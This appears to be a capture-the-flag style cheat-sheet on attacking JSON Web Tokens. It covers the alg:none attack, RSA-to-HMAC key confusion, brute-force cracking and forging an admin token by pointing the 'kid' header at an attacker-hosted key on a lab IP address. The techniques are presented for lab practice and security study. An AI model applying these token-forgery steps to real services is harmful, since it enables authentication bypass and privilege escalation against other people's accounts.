---
layout: post
title: "jwt"
keywords: "jwt, json, token, kid, web token"
---

#### Dissecting a JWToken
```
header.payload.secret

{"typ":"JWT","alg":"RS256/HS256/NONE"}

NONE  -> No signature

RS256 (RSA Signature with SHA-256) is an asymmetric algorithm, and it uses a public/private key pair

HS256 (HMAC with SHA-256), on the other hand, is a symmetric algorithm, with only one (secret) key
--> HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

#### Tools
```
python3 /opt/TokenBreaker/RsaToHmac.py -t <token> -p <public.pem>
python3 /opt/TokenBreaker/TheNone.py -t <token>
jwt-cracker <token> [alphabet] [max-length]
```

> `"kid" (key ID)` is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature - [https://tools.ietf.org/html/rfc7515#section-4.1.4](https://tools.ietf.org/html/rfc7515#section-4.1.4)


#### First create a new private RSA Private Key

```
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
cat jwtRS256.key
cat jwtRS256.key.pub
```

#### Grab header and payload 
-> https://jwt.io/

#### Generate new token

```
private_key = ‘’'
-----BEGIN RSA PRIVATE KEY-----
88CVL/nFFPb+EcPpz9N2OTG4T8gAsYxgAU3q/Llt/NnXASm6CO4p82VXjaGz
-----END RSA PRIVATE KEY-----
‘’'
payload = {"username":"parity0x1","email":"parity0x1@htb.htb","admin_cap":1}
encoded = jwt.encode(payload, private_key, algorithm="RS256",headers={"kid":"http://10.10.14.100:8000/jwtRS256.key"})
print(encoded)
```

#### Replace cookie
```
header.payload.secret
```

#### Start local server
```
python3 -m http.server
```